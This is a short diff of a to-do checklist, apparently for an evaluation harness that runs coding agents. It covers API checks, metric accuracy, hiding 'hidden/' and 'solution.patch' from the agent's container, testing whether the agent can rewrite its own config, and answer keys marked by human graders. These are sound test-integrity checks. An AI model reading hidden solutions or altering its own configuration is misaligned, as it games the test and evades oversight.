-9. **Gabaritos.** T1 e T6 com corretor humano, e o T5 conferido à mão até o I6 ser corrigido.
+   - `/v1/messages`: thinking, temperature coming from `CLAUDE_CODE_EXTRA_BODY`, `count_tokens`.
+   - `/v1/responses`: `reasoning` items with `content`, `apply_patch` through the shell.
+   - Sampling reaching the server, checked with `--verbose`.
+   - Number of requests per turn.
+7. **`agent-metrics.json` against `events.jsonl`.** In particular, see whether Claude Code repeats blocks between `assistant` events of the same message: that would count calls twice and flag false loops.
+8. **First real eval run through `EVAL_WRAPPER`.**
+   - Run S1–S3 with 1 agent.
+   - Confirm that `hidden/` and `solution.patch` are not visible in the container.
+   - Measure the time of the checks and check the `TZ`.
+   - See whether the agent can rewrite its own config in `<log-dir>/home` (M3).
+9. **Answer keys.** T1 and T6 with a human grader, and T5 checked by hand until I6 is fixed.
